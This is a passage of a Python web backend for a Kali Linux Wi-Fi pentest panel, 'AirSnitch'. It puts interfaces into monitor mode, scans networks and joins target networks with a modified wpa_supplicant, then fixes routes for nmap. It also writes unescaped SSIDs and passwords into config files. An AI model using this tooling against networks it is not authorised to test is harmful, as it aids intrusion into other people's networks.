#!/usr/bin/env python3
"""AirSnitch Control Panel – Kali Linux web backend.

Runs natively on Kali. Provides:
  - Wireless interface management (iw, rfkill, airmon-ng)
  - AirSnitch test execution
  - Configuration editor
  - WebSocket terminal (pty shell)
  - Container log equivalent (process output capture)
"""

import asyncio
import json
import logging
import os
import pty
import re
import select
import signal
import struct
import subprocess
import sys

from aiohttp import web
import aiohttp

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("airsnitch-web")

AIRSNITCH_DIR = "/opt/airsnitch/airsnitch/research"
AIRSNITCH_VENV = os.path.join(AIRSNITCH_DIR, "venv", "bin", "activate")
CONFIG_DIR = "/opt/airsnitch/configs"
CONFIG_PATH = os.path.join(CONFIG_DIR, "client.conf")
EXAMPLE_CONFIG = os.path.join(CONFIG_DIR, "client.conf.example")
PROJECT_DIR = os.environ.get("AIRSNITCH_PROJECT_DIR", "/opt/airsnitch")

# Modified wpa_supplicant built by AirSnitch (Vanhoef's research tool)
MODIFIED_WPA_SUPP = os.path.join(PROJECT_DIR, "airsnitch", "wpa_supplicant", "wpa_supplicant")
MODIFIED_WPA_CLI = os.path.join(PROJECT_DIR, "airsnitch", "wpa_supplicant", "wpa_cli")
WPASPY_CTRL_DIR = os.path.join(AIRSNITCH_DIR, "wpaspy_ctrl")

# Store running process output
_process_logs: list[str] = []
MAX_LOG_LINES = 2000

# Track which wpa_supplicant mode is active per interface
_active_wpa_mode: dict[str, str] = {}  # iface -> "standard" | "airsnitch"

# ── Helpers ──────────────────────────────────────────────────────────────────

def get_wpa_supplicant_cmd(mode: str) -> tuple[str, bool]:
    """Return (wpa_supplicant_binary_path, is_modified).
    mode='airsnitch' → modified binary from research dir.
    mode='standard'  → system wpa_supplicant from PATH."""
    if mode == "airsnitch" and os.path.isfile(MODIFIED_WPA_SUPP):
        return MODIFIED_WPA_SUPP, True
    elif mode == "airsnitch":
        log.warning(f"Modified wpa_supplicant not found at {MODIFIED_WPA_SUPP} — falling back to system")
    return "wpa_supplicant", False

def run(cmd: str, timeout: int = 30) -> tuple[int, str]:
    """Run a shell command synchronously, return (returncode, output).
    ONLY for quick commands (<5s). For anything longer, use async_run()."""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.returncode, (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return 1, "Command timed out"
    except Exception as e:
        return 1, str(e)


async def async_run(cmd: str, timeout: int = 30) -> tuple[int, str]:
    """Run a shell command asynchronously — does NOT block the event loop.
    Use for any command that might take more than a few seconds (nmap, scans, etc.)."""
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            output = (stdout.decode("utf-8", errors="replace") +
                      stderr.decode("utf-8", errors="replace")).strip()
            return proc.returncode or 0, output
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            return 1, "Command timed out"
    except Exception as e:
        return 1, str(e)


def append_log(line: str):
    _process_logs.append(line)
    if len(_process_logs) > MAX_LOG_LINES:
        del _process_logs[:len(_process_logs) - MAX_LOG_LINES]


async def obtain_dhcp(iface: str) -> tuple[bool, str, list[str]]:
    """Try to obtain an IP via DHCP. Non-destructive — does NOT kill processes
    or flush IPs, since that tears down the wireless association.
    Returns (got_ip, ip_addr, steps)."""
    steps = []

    # Quick check — maybe we already have an IP (from a previous dhcpcd daemon)
    ip_addr = _get_iface_ip(iface)
    if ip_addr:
        steps.append(f"Already have IP: {ip_addr}")
        return True, ip_addr, steps

    # Log which DHCP clients are available
    have_dhclient = run("which dhclient 2>/dev/null")[0] == 0
    have_dhcpcd = run("which dhcpcd 2>/dev/null")[0] == 0
    have_udhcpc = run("which udhcpc 2>/dev/null")[0] == 0
    steps.append(f"DHCP clients: dhclient={'yes' if have_dhclient else 'no'} "
                 f"dhcpcd={'yes' if have_dhcpcd else 'no'} "
                 f"udhcpc={'yes' if have_udhcpc else 'no'}")
    append_log(steps[-1])

    # Method 1: dhcpcd — kill any stale instance for this iface and start fresh
    dhcpcd_started = False
    if have_dhcpcd:
        # Kill any existing dhcpcd specifically for this interface (stale from previous connect)
        run(f"pkill -9 -f 'dhcpcd.*{iface}' 2>/dev/null", timeout=3)
        await asyncio.sleep(0.5)

        # Fresh dhcpcd request with -w (wait for address before forking)
        rc, out = await async_run(f"dhcpcd --noarp -4 -w {iface} 2>&1", timeout=45)
        steps.append(f"dhcpcd --noarp -4 -w → {'OK' if rc == 0 else 'exit ' + str(rc)}")
        append_log(f"dhcpcd: rc={rc} out={out[:300]}")
        dhcpcd_started = (rc == 0)
        if out:
            steps.append(f"  {out[:200]}")

        # Check for IP immediately — -w should mean we have it
        ip_addr = _get_iface_ip(iface)
        if ip_addr:
            steps.append(f"Got IP from dhcpcd: {ip_addr}")
            return True, ip_addr, steps

        # Poll for IP — in case -w didn't work or IP is slightly delayed
        for wait in [2, 3, 5, 5, 5, 5]:
            await asyncio.sleep(wait)
            ip_addr = _get_iface_ip(iface)
            if ip_addr:
                steps.append(f"Got IP after {wait}s wait: {ip_addr}")
                return True, ip_addr, steps

    # Method 2: dhclient — ONLY if dhcpcd was NOT started (they conflict!)
    if have_dhclient and not dhcpcd_started:
        rc, out = await async_run(f"dhclient -1 -v -pf /run/dhclient-{iface}.pid {iface} 2>&1", timeout=30)
        steps.append(f"dhclient -1 → {'OK' if rc == 0 else 'exit ' + str(rc)}")
        append_log(f"dhclient: rc={rc} out={out[:300]}")
        if out:
            steps.append(f"  {out[:200]}")
        await asyncio.sleep(3)
        ip_addr = _get_iface_ip(iface)
        if ip_addr:
            return True, ip_addr, steps

    # Method 3: udhcpc (busybox) — ONLY if nothing else started
    if have_udhcpc and not dhcpcd_started:
        rc, out = await async_run(f"udhcpc -i {iface} -n -q 2>&1", timeout=20)
        steps.append(f"udhcpc → {'OK' if rc == 0 else 'exit ' + str(rc)}")
        append_log(f"udhcpc: rc={rc} out={out[:300]}")
        if out:
            steps.append(f"  {out[:200]}")
        await asyncio.sleep(3)
        ip_addr = _get_iface_ip(iface)
        if ip_addr:
            return True, ip_addr, steps

    # ── Final chance: DHCP client may still be working in the background ──
    # Give it more time — modified wpa_supplicant can be slower
    for wait in [3, 5, 5, 5]:
        await asyncio.sleep(wait)
        ip_addr = _get_iface_ip(iface)
        if ip_addr:
            steps.append(f"Got IP (late arrival, {wait}s): {ip_addr}")
            return True, ip_addr, steps

    # Dump interface state for debugging
    rc, iface_state = run(f"ip addr show {iface} 2>&1")
    steps.append(f"Interface state: {iface_state[:300]}")
    append_log(f"DHCP failed. Interface state: {iface_state}")

    if "NO-CARRIER" in iface_state:
        steps.append("ERROR: Wireless carrier lost — association dropped during DHCP")
        append_log("ERROR: NO-CARRIER detected — wpa_supplicant association was lost")

    return False, "", steps


async def ensure_subnet_route(iface: str) -> list[str]:
    """Ensure the kernel routing table has a subnet route for this interface.
    Called after DHCP to fix nmap 'failed to determine route' issues.
    dhcpcd sometimes doesn't add the on-link subnet route, which makes
    nmap unable to determine a route to local hosts."""
    steps = []

    # Get IP with CIDR mask
    rc, out = run(f"ip -4 addr show {iface} 2>/dev/null")
    cidr = ""
    for line in out.splitlines():
        if "inet " in line:
            cidr = line.strip().split()[1]          # e.g. "192.168.6.76/24"
            break

    if not cidr or "/" not in cidr:
        return steps

    ip_str, prefix_len = cidr.split("/")

    # Calculate network address from IP + prefix
    parts = [int(p) for p in ip_str.split(".")]
    prefix = int(prefix_len)
    ip_int = (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]
    mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
    net_int = ip_int & mask
    net_addr = (f"{(net_int >> 24) & 0xFF}.{(net_int >> 16) & 0xFF}"
                f".{(net_int >> 8) & 0xFF}.{net_int & 0xFF}")
    net_cidr = f"{net_addr}/{prefix_len}"

    # Check if route already exists
    rc, out = run(f"ip route show {net_cidr} dev {iface} 2>/dev/null")
    if out.strip():
        steps.append(f"Subnet route {net_cidr} already exists")
        return steps

    # Add the on-link route so tools like nmap can resolve routes to local hosts
    rc, out = run(f"ip route add {net_cidr} dev {iface} 2>/dev/null")
    if rc == 0:
        steps.append(f"Added subnet route: {net_cidr} dev {iface}")
    else:
        steps.append(f"Subnet route note: {out or 'already present'}")

    # Also ensure a default route exists for this interface (needed for gateway detection
    # and for scans to work). dhcpcd often skips adding one when another interface already
    # has a default route.
    rc, existing_default = run(f"ip route show default dev {iface} 2>/dev/null")
    if not existing_default.strip():
        # No default route for this interface — check if dhcpcd lease has a gateway
        rc, lease_out = run(f"dhcpcd -U {iface} 2>/dev/null", timeout=5)
        lease_gw = ""
        for line in lease_out.splitlines():
            if line.startswith("routers=") or line.startswith("new_routers="):
                lease_gw = line.split("=", 1)[1].strip().split()[0]
                break
        if lease_gw and re.match(r'^\d+\.\d+\.\d+\.\d+$', lease_gw):
            rc, out = run(f"ip route add default via {lease_gw} dev {iface} metric 600 2>/dev/null")
            if rc == 0:
                steps.append(f"Added default route: via {lease_gw} dev {iface} metric 600")
            else:
                steps.append(f"Default route note: {out or 'already present'}")

    return steps


async def wait_for_association(iface: str, is_modified: bool, max_attempts: int = 10) -> tuple[bool, list[str]]:
    """Poll wpa_supplicant until the interface associates or times out.
    For modified wpa_supplicant, uses the modified wpa_cli via wpaspy_ctrl.
    For stock, uses iw dev link."""
    steps = []
    associated = False

    if is_modified and os.path.isfile(MODIFIED_WPA_CLI):
        # Wait for the control socket to appear first
        ctrl_sock = os.path.join(WPASPY_CTRL_DIR, iface)
        for i in range(6):
            if os.path.exists(ctrl_sock):
                break
            await asyncio.sleep(1)
        if not os.path.exists(ctrl_sock):
            steps.append(f"Warning: control socket {ctrl_sock} not found after 6s")

        # Poll via modified wpa_cli for COMPLETED state
        for attempt in range(max_attempts):
            rc, status_out = run(
                f"cd {AIRSNITCH_DIR} && {MODIFIED_WPA_CLI} -p wpaspy_ctrl -i {iface} status 2>/dev/null",
                timeout=5,
            )
            if "wpa_state=COMPLETED" in status_out:
                associated = True
                # Extract SSID from status output
                for line in status_out.splitlines():
                    if line.startswith("ssid="):
                        steps.append(f"Associated with {line.split('=', 1)[1]}")
                        break
                break
            # Show progress on specific states
            state = ""
            for line in status_out.splitlines():
                if line.startswith("wpa_state="):
                    state = line.split("=", 1)[1]
                    break
            if state:
                steps.append(f"wpa_state={state} (attempt {attempt + 1}/{max_attempts})")
            await asyncio.sleep(2)
    else:
        # Stock wpa_supplicant — use iw dev link
        for attempt in range(max_attempts):
            rc, link_out = run(f"iw dev {iface} link 2>/dev/null")
            if "SSID:" in link_out:
                associated = True
                for line in link_out.splitlines():
                    if "SSID:" in line:
                        steps.append(f"Associated with {line.split('SSID:')[1].strip()}")
                        break
                break
            await asyncio.sleep(2)

    if not associated:
        # One last check via iw as fallback (modified wpa_cli might not work but iw should)
        rc, link_out = run(f"iw dev {iface} link 2>/dev/null")
        if "SSID:" in link_out:
            associated = True
            steps.append("Associated (confirmed via iw)")

    return associated, steps


def _get_iface_ip(iface: str) -> str:
    """Get the IPv4 address of an interface, or empty string."""
    rc, out = run(f"ip -4 addr show {iface} 2>/dev/null")
    for line in out.splitlines():
        if "inet " in line:
            return line.strip().split()[1].split("/")[0]
    return ""


# ── REST API: Wireless Interfaces ────────────────────────────────────────────

async def api_interfaces(request):
    """List wireless interfaces via iw dev."""
    rc, out = run("iw dev 2>/dev/null")
    interfaces = []
    current = None
    for line in out.splitlines():
        stripped = line.strip()
        if stripped.startswith("Interface"):
            if current:
                interfaces.append(current)
            current = {"name": stripped.split()[-1], "details": ""}
        elif current and stripped:
            current["details"] += stripped + "  "
    if current:
        interfaces.append(current)
    return web.json_response({"interfaces": interfaces})


async def api_interface_mode(request):
    """Set interface to monitor or managed mode via airmon-ng."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    mode = body.get("mode", "").strip()  # "monitor" or "managed"
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface name"}, status=400)
    if mode == "monitor":
        rc, out = run(f"airmon-ng start {iface} 2>&1", timeout=15)
    elif mode == "managed":
        rc, out = run(f"airmon-ng stop {iface} 2>&1", timeout=15)
    else:
        return web.json_response({"error": "mode must be 'monitor' or 'managed'"}, status=400)
    return web.json_response({"output": out, "returncode": rc})


async def api_rfkill(request):
    """Show rfkill status / unblock interfaces."""
    action = request.match_info.get("action", "list")
    if action == "list":
        rc, out = run("rfkill list wifi 2>&1")
    elif action == "unblock":
        rc, out = run("rfkill unblock wifi 2>&1")
    else:
        return web.json_response({"error": "Unknown action"}, status=400)
    return web.json_response({"output": out, "returncode": rc})

# ── REST API: Wi-Fi Scan ─────────────────────────────────────────────────────

async def api_wifi_scan(request):
    """Scan for available Wi-Fi networks using iw scan."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)

    # Ensure interface is UP and give hardware time to initialise
    run(f"ip link set {iface} up 2>/dev/null", timeout=3)
    await asyncio.sleep(2)

    out = ""
    rc = 1

    # Check if wpa_supplicant owns the interface
    rc_wpa, _ = run(f"wpa_cli -i {iface} status 2>/dev/null", timeout=3)
    if rc_wpa == 0:
        # wpa_supplicant is running — use wpa_cli scan + scan_results
        run(f"wpa_cli -i {iface} scan 2>/dev/null", timeout=5)
        await asyncio.sleep(5)
        # Get results via wpa_cli (more reliable when wpa_supplicant owns iface)
        rc_wr, wpa_results = run(f"wpa_cli -i {iface} scan_results 2>/dev/null", timeout=5)
        # Also try iw scan dump as it gives richer data
        rc, out = await async_run(f"iw dev {iface} scan dump 2>&1", timeout=10)
        # If iw gave nothing useful, parse wpa_cli results
        if "BSS " not in out and rc_wr == 0 and wpa_results.strip():
            out = wpa_results
    else:
        # No wpa_supplicant — use blocking iw scan (waits for completion)
        rc, out = await async_run(f"iw dev {iface} scan 2>&1", timeout=20)
        if rc != 0:
            # Retry once — the first scan after interface up often fails
            await asyncio.sleep(2)
            rc, out = await async_run(f"iw dev {iface} scan 2>&1", timeout=20)

    if rc != 0 or ("command failed" in out.lower() and "BSS " not in out):
        # Fallback: try iwlist
        rc, out = await async_run(f"iwlist {iface} scan 2>&1", timeout=15)

    networks = []

    # Try parsing as wpa_cli scan_results first (tab-separated):
    # bssid / frequency / signal level / flags / ssid
    if "BSS " not in out and "\t" in out:
        for line in out.splitlines():
            parts = line.split("\t")
            if len(parts) >= 5 and ":" in parts[0] and len(parts[0]) == 17:
                bssid = parts[0]
                freq = parts[1].strip()
                signal = parts[2].strip() + " dBm"
                flags = parts[3].strip()
                ssid = parts[4].strip()
                sec = ""
                if "WPA2-PSK" in flags or "RSN-PSK" in flags:
                    sec = "PSK "
                elif "WPA2-EAP" in flags or "RSN-EAP" in flags:
                    sec = "EAP "
                elif "SAE" in flags:
                    sec = "SAE "
                elif "WPA-PSK" in flags:
                    sec = "PSK "
                if ssid:
                    networks.append({
                        "bssid": bssid, "ssid": ssid, "signal": signal,
                        "freq": freq, "channel": "", "security": sec or "Open"
                    })
    else:
        # Parse iw scan dump / iw scan output
        current = {}
        for line in out.splitlines():
            stripped = line.strip()
            if stripped.startswith("BSS "):
                if current.get("ssid"):
                    networks.append(current)
                bssid = stripped.split()[1].split("(")[0]
                current = {"bssid": bssid, "ssid": "", "signal": "", "freq": "", "channel": "", "security": ""}
            elif stripped.startswith("SSID:"):
                current["ssid"] = stripped[5:].strip()
            elif stripped.startswith("signal:"):
                current["signal"] = stripped.split(":")[1].strip()
            elif stripped.startswith("freq:"):
                current["freq"] = stripped.split(":")[1].strip()
            elif stripped.startswith("DS Parameter set: channel"):
                current["channel"] = stripped.split("channel")[1].strip()
            elif "RSN:" in stripped or "WPA:" in stripped:
                current["security"] += stripped + " "
            elif "PSK" in stripped:
                if "PSK" not in current["security"]:
                    current["security"] += "PSK "
            elif "SAE" in stripped:
                if "SAE" not in current["security"]:
                    current["security"] += "SAE "
            elif "802.1X" in stripped or "EAP" in stripped:
                if "EAP" not in current["security"]:
                    current["security"] += "EAP "
        if current.get("ssid"):
            networks.append(current)

    # Clean up security strings
    for n in networks:
        sec = n["security"].strip()
        if not sec:
            sec = "Open"
        n["security"] = sec

    # Dedupe by SSID, keep strongest signal
    seen = {}
    for n in networks:
        if n["ssid"] not in seen:
            seen[n["ssid"]] = n
    networks = sorted(seen.values(), key=lambda x: x.get("ssid", ""))

    return web.json_response({"networks": networks})

# ── REST API: USB Devices ────────────────────────────────────────────────────

async def api_usb_devices(request):
    """List USB devices via lsusb."""
    rc, out = run("lsusb 2>/dev/null")
    devices = [line.strip() for line in out.splitlines() if line.strip()]
    return web.json_response({"devices": devices})

# ── REST API: Pentest Tools (Single NIC) ─────────────────────────────────────

async def api_pentest_connect(request):
    """Connect to the target network using wpa_supplicant + DHCP."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    mode = body.get("mode", "standard").strip()
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)
    if not os.path.exists(CONFIG_PATH):
        return web.json_response({"error": "No config file — run the Setup Wizard first"}, status=400)

    # Determine which wpa_supplicant to use
    wpa_bin, is_modified = get_wpa_supplicant_cmd(mode)

    steps = []
    steps.append(f"Mode: {'AirSnitch modified' if is_modified else 'Standard stock'} wpa_supplicant")

    # ── Gentle cleanup: kill processes but don't deconfigure the interface ──
    run(f"wpa_cli -i {iface} terminate 2>/dev/null", timeout=3)
    if os.path.isfile(MODIFIED_WPA_CLI):
        run(f"{MODIFIED_WPA_CLI} -p wpaspy_ctrl -i {iface} terminate 2>/dev/null", timeout=3)
    await asyncio.sleep(1)
    run("killall -9 wpa_supplicant 2>/dev/null", timeout=3)
    run("killall -9 dhcpcd 2>/dev/null", timeout=3)
    run("killall -9 dhclient 2>/dev/null", timeout=3)
    await asyncio.sleep(2)

    # Clean up old wpaspy_ctrl sockets if using modified mode
    if is_modified:
        run(f"rm -rf {WPASPY_CTRL_DIR} 2>/dev/null", timeout=3)

    # Flush IP and bring interface up (avoid full down/up cycle which can lose the device)
    run(f"ip addr flush dev {iface} 2>/dev/null", timeout=3)
    run(f"ip link set {iface} up 2>/dev/null", timeout=3)
    await asyncio.sleep(2)

    # Verify the interface exists; if it disappeared, wait and retry
    # Some wireless drivers need several seconds to re-enumerate after wpa_supplicant dies
    rc, dev_check = run(f"ip link show {iface} 2>&1", timeout=3)
    if rc != 0 or "does not exist" in dev_check:
        steps.append(f"Interface {iface} disappeared — attempting recovery...")
        run("rfkill unblock wifi 2>/dev/null", timeout=3)
        for attempt in range(4):
            await asyncio.sleep(3)
            run(f"ip link set {iface} up 2>/dev/null", timeout=3)
            await asyncio.sleep(1)
            rc, dev_check = run(f"ip link show {iface} 2>&1", timeout=3)
            if rc == 0 and "does not exist" not in dev_check:
                steps.append(f"Interface {iface} recovered after {(attempt+1)*4}s")
                break
        else:
            steps.append(f"ERROR: Interface {iface} still not found after recovery")
            return web.json_response({"error": f"Interface {iface} not found — it may have been renamed or removed", "steps": steps}, status=500)

    steps.append(f"Interface {iface} ready")

    # Start wpa_supplicant (new association)
    if is_modified:
        wpa_cmd = f"cd {AIRSNITCH_DIR} && {wpa_bin} -Dnl80211 -B -i {iface} -c {CONFIG_PATH} 2>&1"
        rc, out = run(f"bash -c '{wpa_cmd}'", timeout=10)
        steps.append(f"wpa_supplicant (modified) → {'OK' if rc == 0 else out}")
    else:
        rc, out = run(f"wpa_supplicant -B -i {iface} -c {CONFIG_PATH} 2>&1", timeout=10)
        steps.append(f"wpa_supplicant (stock) → {'OK' if rc == 0 else out}")
    if rc != 0:
        return web.json_response({"error": f"wpa_supplicant failed: {out}", "steps": steps}, status=500)

    # Wait for association with retries (modified supplicant can be slower)
    associated, assoc_steps = await wait_for_association(iface, is_modified, max_attempts=10)
    steps.extend(assoc_steps)
    if not associated:
        steps.append("Association failed — wrong password or network out of range")
        return web.json_response({"error": "Failed to associate with network", "steps": steps}, status=500)

    # Get IP via robust DHCP helper (tries dhclient, dhcpcd, retries)
    got_ip, ip_addr, dhcp_steps = await obtain_dhcp(iface)
    steps.extend(dhcp_steps)

    # Ensure subnet route exists (fixes nmap "failed to determine route")
    if got_ip:
        route_steps = await ensure_subnet_route(iface)
        steps.extend(route_steps)

    wpa_label = "AirSnitch modified" if is_modified else "standard"
    msg = f"Connected ({ip_addr}) via {wpa_label} wpa_supplicant" if got_ip else "Associated but no IP yet — try Get Network Info in a few seconds"
    append_log(f"Connect {iface} [{wpa_label}]: {msg}")
    _active_wpa_mode[iface] = mode
    return web.json_response({"message": msg, "connected": got_ip, "steps": steps, "wpa_mode": mode})


QUICK_CONF_PATH = os.path.join(CONFIG_DIR, "quick_connect.conf")

async def api_pentest_quickconnect(request):
    """Scan-and-connect: generate a temp wpa_supplicant config on-the-fly and connect."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    ssid = body.get("ssid", "").strip()
    security = body.get("security", "WPA-PSK").strip()
    password = body.get("password", "").strip()
    mode = body.get("mode", "standard").strip()

    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)
    if not ssid:
        return web.json_response({"error": "SSID is required"}, status=400)

    # Determine which wpa_supplicant to use
    wpa_bin, is_modified = get_wpa_supplicant_cmd(mode)

    # Build minimal wpa_supplicant config
    # Modified uses wpaspy_ctrl (relative path from research dir); standard uses system path
    ctrl_iface = "wpaspy_ctrl" if is_modified else "/var/run/wpa_supplicant"
    conf_lines = [f"ctrl_interface={ctrl_iface}", ""]
    conf_lines.append("network={")
    conf_lines.append(f'\tssid="{ssid}"')

    if security in ("WPA-PSK", "WPA2-PSK"):
        if not password:
            return web.json_response({"error": "Password required for WPA-PSK"}, status=400)
        conf_lines.append(f"\tkey_mgmt=WPA-PSK")
        conf_lines.append(f'\tpsk="{password}"')
    elif security == "SAE":
        if not password:
            return web.json_response({"error": "Password required for WPA3 (SAE)"}, status=400)
        conf_lines.append(f"\tkey_mgmt=SAE")
        conf_lines.append(f'\tsae_password="{password}"')
        conf_lines.append("\tieee80211w=2")
    elif security in ("NONE", "Open", ""):
        conf_lines.append("\tkey_mgmt=NONE")
    elif security in ("WPA-EAP", "EAP"):
        # Enterprise — need identity/password from body
        identity = body.get("identity", "").strip()
        eap_method = body.get("eap_method", "PEAP").strip()
        if not identity or not password:
            return web.json_response({"error": "Identity and password required for Enterprise"}, status=400)
        conf_lines.append(f"\tkey_mgmt=WPA-EAP")
        conf_lines.append(f"\teap={eap_method}")
        conf_lines.append(f'\tphase2="auth=MSCHAPV2"')
        conf_lines.append(f'\tidentity="{identity}"')
        conf_lines.append(f'\tpassword="{password}"')
    else:
        # Default to WPA-PSK
        if password:
            conf_lines.append(f"\tkey_mgmt=WPA-PSK")
            conf_lines.append(f'\tpsk="{password}"')
        else:
            conf_lines.append("\tkey_mgmt=NONE")

    conf_lines.append("}")

    # Write temp config
    try:
        os.makedirs(CONFIG_DIR, exist_ok=True)
        with open(QUICK_CONF_PATH, "w") as f:
            f.write("\n".join(conf_lines) + "\n")
    except Exception as e:
        return web.json_response({"error": f"Failed to write config: {e}"}, status=500)

    steps = []
    steps.append(f"Mode: {'AirSnitch modified' if is_modified else 'Standard stock'} wpa_supplicant")

    # ── Gentle cleanup: kill processes but don't deconfigure the interface ──
    # 1. Tell wpa_supplicant to quit gracefully (try both control interface paths)
    run(f"wpa_cli -i {iface} terminate 2>/dev/null", timeout=3)
    if os.path.isfile(MODIFIED_WPA_CLI):
        run(f"{MODIFIED_WPA_CLI} -p wpaspy_ctrl -i {iface} terminate 2>/dev/null", timeout=3)
    await asyncio.sleep(1)
    # 2. Hard-kill any remaining wpa_supplicant / DHCP daemons (no graceful shutdown)
    #    IMPORTANT: Do NOT use `dhcpcd -k` — it sends DHCP RELEASE and deconfigures
    #    the interface, which can cause the wireless driver to drop the device entirely.
    run("killall -9 wpa_supplicant 2>/dev/null", timeout=3)
    run("killall -9 dhcpcd 2>/dev/null", timeout=3)
    run("killall -9 dhclient 2>/dev/null", timeout=3)
    await asyncio.sleep(2)

    # Clean up old wpaspy_ctrl sockets if using modified mode
    if is_modified:
        run(f"rm -rf {WPASPY_CTRL_DIR} 2>/dev/null", timeout=3)

    # 3. Flush IP and bring interface up (avoid full down/up cycle which can lose the device)
    run(f"ip addr flush dev {iface} 2>/dev/null", timeout=3)
    run(f"ip link set {iface} up 2>/dev/null", timeout=3)
    await asyncio.sleep(2)

    # Verify the interface exists; if it disappeared, wait and retry
    # Some wireless drivers need several seconds to re-enumerate after wpa_supplicant dies
    rc, dev_check = run(f"ip link show {iface} 2>&1", timeout=3)
    if rc != 0 or "does not exist" in dev_check:
        steps.append(f"Interface {iface} disappeared — attempting recovery...")
        run("rfkill unblock wifi 2>/dev/null", timeout=3)
        # Try multiple rounds of waiting — some drivers are slow
        for attempt in range(4):
            await asyncio.sleep(3)
            run(f"ip link set {iface} up 2>/dev/null", timeout=3)
            await asyncio.sleep(1)
            rc, dev_check = run(f"ip link show {iface} 2>&1", timeout=3)
            if rc == 0 and "does not exist" not in dev_check:
                steps.append(f"Interface {iface} recovered after {(attempt+1)*4}s")
                break
        else:
            steps.append(f"ERROR: Interface {iface} still not found after recovery")
            return web.json_response({"error": f"Interface {iface} not found — it may have been renamed or removed", "steps": steps, "phase": "auth"})

    steps.append(f"Interface {iface} ready")

    # Start wpa_supplicant (new association)
    if is_modified:
        # Modified: run from research dir so wpaspy_ctrl is created there, use -Dnl80211
        wpa_cmd = f"cd {AIRSNITCH_DIR} && {wpa_bin} -Dnl80211 -B -i {iface} -c {QUICK_CONF_PATH} 2>&1"
        rc, out = run(f"bash -c '{wpa_cmd}'", timeout=10)
        steps.append(f"wpa_supplicant (modified) → {'OK' if rc == 0 else out}")
    else:
        rc, out = run(f"wpa_supplicant -B -i {iface} -c {QUICK_CONF_PATH} 2>&1", timeout=10)
        steps.append(f"wpa_supplicant (stock) → {'OK' if rc == 0 else out}")
    if rc != 0:
        return web.json_response({"error": f"wpa_supplicant failed: {out}", "steps": steps, "phase": "auth"})

    # Wait for association with retries (modified supplicant can be slower)
    associated, assoc_steps = await wait_for_association(iface, is_modified, max_attempts=12)
    steps.extend(assoc_steps)

    if not associated:
        steps.append("Association failed — wrong password or network out of range")
        return web.json_response({"error": "Failed to associate with network", "steps": steps, "phase": "auth"})

    steps.append(f"Associated with {ssid}")

    # Get IP via robust DHCP helper (tries dhclient, dhcpcd, retries)
    got_ip, ip_addr, dhcp_steps = await obtain_dhcp(iface)
    steps.extend(dhcp_steps)

    # Ensure subnet route exists (fixes nmap "failed to determine route")
    if got_ip:
        route_steps = await ensure_subnet_route(iface)
        steps.extend(route_steps)

    wpa_label = "AirSnitch modified" if is_modified else "standard"
    msg = f"Connected to {ssid} ({ip_addr}) via {wpa_label} wpa_supplicant" if got_ip else f"Associated with {ssid} but no IP yet"
    append_log(f"QuickConnect {iface} [{wpa_label}]: {msg}")

    # Track which mode is active for this interface
    _active_wpa_mode[iface] = mode

    return web.json_response({
        "message": msg,
        "connected": got_ip,
        "ssid": ssid,
        "ip": ip_addr,
        "steps": steps,
        "phase": "complete",
        "wpa_mode": mode,
    })


async def api_pentest_disconnect(request):
    """Disconnect from the network."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)

    # Graceful wpa_supplicant shutdown first (try both control interface paths)
    run(f"wpa_cli -i {iface} disconnect 2>/dev/null", timeout=3)
    run(f"wpa_cli -i {iface} terminate 2>/dev/null", timeout=3)
    if os.path.isfile(MODIFIED_WPA_CLI):
        run(f"{MODIFIED_WPA_CLI} -p wpaspy_ctrl -i {iface} terminate 2>/dev/null", timeout=3)
    # Hard-kill all daemons — no dhcpcd -k (deconfigures interface)
    run("killall -9 wpa_supplicant 2>/dev/null", timeout=3)
    run("killall -9 dhcpcd 2>/dev/null", timeout=3)
    run("killall -9 dhclient 2>/dev/null", timeout=3)
    # Flush IP config but keep interface up (avoid down/up cycle which can lose the device)
    run(f"ip addr flush dev {iface} 2>/dev/null", timeout=3)
    run(f"ip link set {iface} up 2>/dev/null", timeout=3)
    # Clean up wpaspy_ctrl sockets
    run(f"rm -rf {WPASPY_CTRL_DIR} 2>/dev/null", timeout=3)

    # Clear mode tracking
    _active_wpa_mode.pop(iface, None)

    append_log(f"Disconnected {iface}")
    return web.json_response({"message": "Disconnected"})


async def api_pentest_retrydhcp(request):
    """Retry DHCP on an already-associated interface."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)

    append_log(f"Retrying DHCP on {iface}")
    got_ip, ip_addr, steps = await obtain_dhcp(iface)

    # Ensure subnet route exists after DHCP
    if got_ip:
        route_steps = await ensure_subnet_route(iface)
        steps.extend(route_steps)

    return web.json_response({
        "connected": got_ip,
        "ip": ip_addr,
        "steps": steps,
    })


async def api_quickcheck(request):
    """Lightweight IP check — no gateway detection, no arping, no ping.
    Used by the JS fallback to quickly see if DHCP has completed."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)
    ip_addr = _get_iface_ip(iface)
    return web.json_response({
        "connected": bool(ip_addr),
        "ip": ip_addr,
